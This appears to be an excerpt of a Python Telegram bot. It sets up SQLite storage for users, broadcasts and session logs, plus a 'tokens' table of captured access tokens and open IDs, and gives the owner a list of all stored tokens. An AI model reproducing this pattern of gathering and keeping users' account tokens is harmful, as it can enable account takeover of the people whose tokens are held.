...
# ============ TEST.PY ইম্পোর্ট এরর হ্যান্ডেল ============
try:
    from test import *
    print("✅ test.py loaded successfully")
except Exception as e:
    print(f"⚠️ test.py import error: {e}")
    def generate_hex_content(token):
        print("⚠️ generate_hex_content: test.py not loaded")
        return None, None
# ========================================================
...
def init_database():
    ...
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, chat_id INTEGER, joined_at TEXT, is_blocked INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0)""")
    c.execute("""CREATE TABLE IF NOT EXISTS tokens (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, open_id TEXT, access_token TEXT UNIQUE, captured_at TEXT, FOREIGN KEY(user_id) REFERENCES users(user_id))""")
    c.execute("""CREATE TABLE IF NOT EXISTS broadcasts (id INTEGER PRIMARY KEY AUTOINCREMENT, message TEXT, sent_at TEXT, total_sent INTEGER)""")
    c.execute("""CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS sessions_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, access_token TEXT, open_id TEXT, started_at TEXT, stopped_at TEXT, is_active INTEGER DEFAULT 1)""")
...
def db_add_user(user_id, username, first_name, chat_id):
    try:
        ...
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id, username, first_name, chat_id, joined_at) VALUES (?, ?, ?, ?, ?)", (user_id, username or "N/A", first_name or "N/A", chat_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
    except:
        pass
...
def db_save_token(user_id, open_id, access_token):
    ...
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO tokens (user_id, open_id, access_token, captured_at) VALUES (?, ?, ?, ?)", (user_id, open_id, access_token, timestamp))
        conn.commit()
        if c.rowcount > 0:
    ...
    try:
        ...
        for d in data:
            if d.get("access_token") == access_token:
                return
        data.append({"user_id": user_id, "open_id": open_id, "access_token": access_token, "captured_at": timestamp})
...
def db_get_all_tokens():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT tokens.*, users.username, users.first_name FROM tokens LEFT JOIN users ON tokens.user_id = users.user_id ORDER BY tokens.id DESC")
        return c.fetchall()
    except:
        return []
...
def db_log_session(user_id, access_token, open_id, started_at, stopped_at=None, is_active=1):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("INSERT INTO sessions_log (user_id, access_token, open_id, started_at, stopped_at, is_active) VALUES (?, ?, ?, ?, ?, ?)", (user_id, access_token, open_id, started_at, stopped_at, is_active))
        conn.commit()
        conn.close()
    except:
        pass
...
def db_stop_active_sessions(user_id):
    try:
        ...
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("UPDATE sessions_log SET stopped_at = ?, is_active = 0 WHERE user_id = ? AND is_active = 1", (now, user_id))
        conn.commit()
        conn.close()
    except:
        pass
...
async def owner_panel(update, context):
    ...
    kb = [
        ...
        [InlineKeyboardButton("🛠️ Maintenance ON" if not MAINTENANCE_MODE else "✅ Maintenance OFF", callback_data="owner_maint_on" if not MAINTENANCE_MODE else "owner_maint_off")],
